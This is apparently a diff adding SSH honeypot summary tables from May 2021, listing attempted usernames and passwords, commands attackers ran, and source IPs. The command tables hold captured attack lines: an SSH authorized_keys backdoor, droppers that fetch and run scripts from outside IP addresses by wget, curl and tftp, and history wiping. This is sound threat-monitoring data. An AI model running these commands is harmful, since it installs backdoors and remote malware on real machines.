@@ -1,0 +1,552 @@
++-----------------------------------------------------------------------------+
+| Date         | Sensor                         | Username | Password | Count |
+|--------------+--------------------------------+----------+----------+-------|
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18914 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root |     test |   272 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   124 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18726 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   106 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |    admin |    17 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18667 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |   111111 |   175 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root | superman |   110 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18541 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |    89 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |   123123 |    55 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18377 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   108 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |   111111 |    10 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18314 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   107 |
+| 2021-05-03   | ubuntu-18-04-lts-honeypot-mon… |     root |   123123 |    10 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18156 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   114 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |   123123 |    54 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18026 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root | superman |   272 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |    73 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18015 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   142 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |     test |   110 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 18002 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |     root |  testing |   252 |
+| 2021-05-06   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |    83 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 17981 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   125 |
+| 2021-05-05   | ubuntu-18-04-lts-honeypot-mon… |     root |  testing |   110 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 | 17261 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |    77 |
+| 2021-05-04   | ubuntu-18-04-lts-honeypot-mon… |     root |   111111 |    52 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 |  6188 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   284 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |    admin |    admin |     7 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 |  6070 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   428 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |    admin |    admin |     7 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |     root |     1234 |  1156 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   413 |
+| 2021-05-02   | ubuntu-18-04-lts-honeypot-mon… |     root |     root |     8 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   177 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |     root |    admin |     5 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |     root |     root |     5 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   149 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |    admin | password |     5 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |    admin |    admin |     5 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |    nproc |    nproc |   146 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |   nobody |   nobody |     3 |
+| 2021-05-01   | ubuntu-18-04-lts-honeypot-mon… |  support |  support |     3 |
++-----------------------------------------------------------------------------+
++-----------------------------------------------------------------------------+
+| Date         | Sensor                   |                   Command | Count |
+|--------------+--------------------------+---------------------------+-------|
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                  uname -a |   139 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                     uname |   129 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                       top |   129 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                  uname -a |   110 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   109 |
+|              |                          |              name | wc -l |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   107 |
+|              |                          | model | grep name | wc -l |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1570 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |                       top |    68 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |    68 |
+|              |                          | model | grep name | wc -l |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1368 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |                  uname -a |   101 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |    90 |
+|              |                          | model | grep name | wc -l |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                  uname -a |   109 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                       top |   109 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                crontab -l |   109 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                  uname -a |   108 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |  free -m | grep Mem | awk |   107 |
+|              |                          |   '{print $2 ,$3, $4, $5, |       |
+|              |                          |                  $6, $7}' |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   107 |
+|              |                          |    name | head -n 1 | awk |       |
+|              |                          |                   '{print |       |
+|              |                          |      $4,$5,$6,$7,$8,$9;}' |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1565 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |                  uname -a |   141 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |  free -m | grep Mem | awk |   118 |
+|              |                          |   '{print $2 ,$3, $4, $5, |       |
+|              |                          |                  $6, $7}' |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                  uname -a |    86 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |    77 |
+|              |                          |              name | wc -l |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    76 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |   261 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   144 |
+|              |                          |    name | head -n 1 | awk |       |
+|              |                          |                   '{print |       |
+|              |                          |      $4,$5,$6,$7,$8,$9;}' |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   144 |
+|              |                          |              name | wc -l |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  3165 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                  uname -a |    97 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                       top |    85 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  3297 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |                  uname -a |   151 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |                  uname -m |   146 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  2146 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |                  uname -a |    81 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |    76 |
+|              |                          |              name | wc -l |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   287 |
+|              |                          |    name | head -n 1 | awk |       |
+|              |                          |                   '{print |       |
+|              |                          |      $4,$5,$6,$7,$8,$9;}' |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   287 |
+|              |                          |              name | wc -l |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |        lscpu | grep Model |   286 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |                  uname -m |   438 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |                         w |   438 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |                crontab -l |   438 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |                  uname -a |   477 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |  free -m | grep Mem | awk |   440 |
+|              |                          |   '{print $2 ,$3, $4, $5, |       |
+|              |                          |                  $6, $7}' |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   440 |
+|              |                          |    name | head -n 1 | awk |       |
+|              |                          |                   '{print |       |
+|              |                          |      $4,$5,$6,$7,$8,$9;}' |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |                  uname -a |   182 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |        lscpu | grep Model |   178 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |                     uname |   178 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |   153 |
+|              |                          |              name | wc -l |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   145 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |        lscpu | grep Model |   145 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |        lscpu | grep Model |   146 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |                  uname -a |   146 |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |                     uname |   146 |
++-----------------------------------------------------------------------------+
++-----------------------------------------------------------------------------+
+| Date         | Sensor                   |    Pre-disconnect-command | Count |
+|--------------+--------------------------+---------------------------+-------|
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   125 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |            cat /etc/issue |    16 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                  uname -a |    11 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   102 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |            cat /etc/issue |    16 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |       pkill kitten; pkill |    13 |
+|              |                          |    YDEdr; pkill ip; pkill |       |
+|              |                          | xmrig; pkill cnrig; pkill |       |
+|              |                          |    kswapd0; pkill x86_64; |       |
+|              |                          |    pkill x86; cd /tmp; rm |       |
+|              |                          |   -rf config.json; rm -rf |       |
+|              |                          |              kitten; wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |                   curl -O |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |              busybox wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |  chmod 777 *; sh boom.sh; |       |
+|              |                          |           cat /etc/issue; |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1570 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    66 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… | cd /tmp || cd /var/run || |    11 |
+|              |                          | cd /mnt || cd /root || cd |       |
+|              |                          |                   /; wget |       |
+|              |                          | http://2.57.122.149/z.sh; |       |
+|              |                          |                   curl -O |       |
+|              |                          | http://2.57.122.149/z.sh; |       |
+|              |                          |  chmod 777 z.sh; sh z.sh; |       |
+|              |                          |  tftp 2.57.122.149 -c get |       |
+|              |                          |   tz.sh; chmod 777 tz.sh; |       |
+|              |                          |  sh tz.sh; tftp -r tz2.sh |       |
+|              |                          |    -g 2.57.122.149; chmod |       |
+|              |                          |    777 tz2.sh; sh tz2.sh; |       |
+|              |                          | ftpget -v -u anonymous -p |       |
+|              |                          |           anonymous -P 21 |       |
+|              |                          | 2.57.122.149 z1.sh z1.sh; |       |
+|              |                          |     sh z1.sh; rm -rf z.sh |       |
+|              |                          |    tz.sh tz2.sh z1.sh; rm |       |
+|              |                          |                     -rf * |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1368 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    86 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |            cat /etc/issue |    16 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   108 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |  cd /var/run ; rm -rf tsh |     3 |
+|              |                          |    ; tftp -g 127.0.0.1 -r |       |
+|              |                          |            tsh ; sh tsh & |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                       top |     1 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    98 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |     rm -rf /var/tmp/dota* |     5 |
+| 2021-05-03   | ubuntu-18-04-lts-honeyp… |                    start; |     3 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  1565 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   115 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |                  uname -a |    24 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    76 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |                  uname -a |    10 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |            apt-get update |     5 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |   261 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   140 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |     rm -rf /var/tmp/dota* |     2 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  3165 |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    81 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-06   | ubuntu-18-04-lts-honeyp… |  cd /tmp || cd /run || cd |    19 |
+|              |                          |                   /; wget |       |
+|              |                          | http://104.248.142.228/y… |       |
+|              |                          | chmod 777 yoyobins.sh; sh |       |
+|              |                          |         yoyobins.sh; tftp |       |
+|              |                          |    104.248.142.228 -c get |       |
+|              |                          |   yoyotftp1.sh; chmod 777 |       |
+|              |                          |          yoyotftp1.sh; sh |       |
+|              |                          |     yoyotftp1.sh; tftp -r |       |
+|              |                          |           yoyotftp2.sh -g |       |
+|              |                          |    104.248.142.228; chmod |       |
+|              |                          |      777 yoyotftp2.sh; sh |       |
+|              |                          |      yoyotftp2.sh; rm -rf |       |
+|              |                          |  yoyobins.sh yoyotftp1.sh |       |
+|              |                          |    yoyotftp2.sh; rm -rf * |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  3297 |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   142 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-05   | ubuntu-18-04-lts-honeyp… |       pkill kitten; pkill |    13 |
+|              |                          |    YDEdr; pkill ip; pkill |       |
+|              |                          | xmrig; pkill cnrig; pkill |       |
+|              |                          |    kswapd0; pkill x86_64; |       |
+|              |                          |    pkill x86; cd /tmp; rm |       |
+|              |                          |   -rf config.json; rm -rf |       |
+|              |                          |              kitten; wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |                   curl -O |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |              busybox wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |  chmod 777 *; sh boom.sh; |       |
+|              |                          |           cat /etc/issue; |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |  2146 |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |    75 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-04   | ubuntu-18-04-lts-honeyp… |            cat /etc/issue |    32 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   285 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |   cat /etc/issue; cd /tmp |     3 |
+|              |                          | || cd /var/run || cd /mnt |       |
+|              |                          | || cd /root || cd /; wget |       |
+|              |                          |                        -q |       |
+|              |                          | http://179.43.176.41/1a9… |       |
+|              |                          |      cat meth.x86 > meth; |       |
+|              |                          |  chmod +x meth; chmod 777 |       |
+|              |                          | *; ./meth rooted; history |       |
+|              |                          |                        -c |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |     1 |
+|              |                          |    name | head -n 1 | awk |       |
+|              |                          |                   '{print |       |
+|              |                          |      $4,$5,$6,$7,$8,$9;}' |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   425 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |        echo -e "\x6F\x6B" |    48 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |       pkill kitten; pkill |    13 |
+|              |                          |    YDEdr; pkill ip; pkill |       |
+|              |                          | xmrig; pkill cnrig; pkill |       |
+|              |                          |    kswapd0; pkill x86_64; |       |
+|              |                          |    pkill x86; cd /tmp; rm |       |
+|              |                          |   -rf config.json; rm -rf |       |
+|              |                          |              kitten; wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |                   curl -O |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |              busybox wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |  chmod 777 *; sh boom.sh; |       |
+|              |                          |           cat /etc/issue; |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   439 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |                  uname -a |    38 |
+| 2021-05-02   | ubuntu-18-04-lts-honeyp… |       pkill kitten; pkill |    13 |
+|              |                          |    YDEdr; pkill ip; pkill |       |
+|              |                          | xmrig; pkill cnrig; pkill |       |
+|              |                          |    kswapd0; pkill x86_64; |       |
+|              |                          |    pkill x86; cd /tmp; rm |       |
+|              |                          |   -rf config.json; rm -rf |       |
+|              |                          |              kitten; wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |                   curl -O |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |              busybox wget |       |
+|              |                          | http://88.218.17.142/boo… |       |
+|              |                          |  chmod 777 *; sh boom.sh; |       |
+|              |                          |           cat /etc/issue; |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   177 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |   cat /etc/issue; cd /tmp |     3 |
+|              |                          | || cd /var/run || cd /mnt |       |
+|              |                          | || cd /root || cd /; wget |       |
+|              |                          |                        -q |       |
+|              |                          | http://179.43.176.41/com… |       |
+|              |                          |      cat cometome > meth; |       |
+|              |                          |  chmod +x meth; chmod 777 |       |
+|              |                          | *; ./meth rooted; history |       |
+|              |                          |                        -c |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |  cd /var/run ; rm -rf tsh |     2 |
+|              |                          |    ; tftp -g 127.0.0.1 -r |       |
+|              |                          |            tsh ; sh tsh & |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   145 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |  cat /proc/cpuinfo | grep |     4 |
+|              |                          |              name | wc -l |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |    cd ~ && rm -rf .ssh && |   145 |
+|              |                          |        mkdir .ssh && echo |       |
+|              |                          |                  "ssh-rsa |       |
+|              |                          | AAAAB3NzaC1yc2EAAAABJQAA… |       |
+|              |                          | mdrfckr">>.ssh/authorize… |       |
+|              |                          | && chmod -R go= ~/.ssh && |       |
+|              |                          |                      cd ~ |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |   cat /etc/issue; cd /tmp |     3 |
+|              |                          | || cd /var/run || cd /mnt |       |
+|              |                          | || cd /root || cd /; wget |       |
+|              |                          |                        -q |       |
+|              |                          | http://179.43.176.41/com… |       |
+|              |                          |      cat cometome > meth; |       |
+|              |                          |  chmod +x meth; chmod 777 |       |
+|              |                          | *; ./meth rooted; history |       |
+|              |                          |                        -c |       |
+| 2021-05-01   | ubuntu-18-04-lts-honeyp… |     rm -rf /var/tmp/dota* |     1 |
++-----------------------------------------------------------------------------+
++-----------------------------------------------------------------------------+
+| Date         | Sensor           |       Source IP |     Destination | Count |
+|              |                  |                 |            Port |       |
+|--------------+------------------+-----------------+-----------------+-------|
+| 2021-05-06   | ubuntu-18-04-lt… |     5.188.87.49 |            2222 |  1247 |
+| 2021-05-06   | ubuntu-18-04-lt… |     5.188.87.60 |            2222 |  1217 |
+| 2021-05-06   | ubuntu-18-04-lt… |    5.188.86.216 |            2222 |  1191 |
+| 2021-05-03   | ubuntu-18-04-lt… |    5.188.86.216 |            2222 |  1196 |
+| 2021-05-03   | ubuntu-18-04-lt… |     5.188.87.49 |            2222 |  1138 |
+| 2021-05-03   | ubuntu-18-04-lt… |    5.188.86.178 |            2222 |  1131 |
+| 2021-05-05   | ubuntu-18-04-lt… |   116.62.65.226 |            2222 |  1398 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.165 |            2222 |  1391 |
+| 2021-05-05   | ubuntu-18-04-lt… |    5.188.86.168 |            2222 |  1122 |
+| 2021-05-04   | ubuntu-18-04-lt… |   39.106.84.128 |            2222 |  1372 |
+| 2021-05-04   | ubuntu-18-04-lt… |    5.188.86.206 |            2222 |  1151 |
+| 2021-05-04   | ubuntu-18-04-lt… |    5.188.86.210 |            2222 |  1116 |
+| 2021-05-03   | ubuntu-18-04-lt… |    5.188.86.178 |            2222 |  1159 |
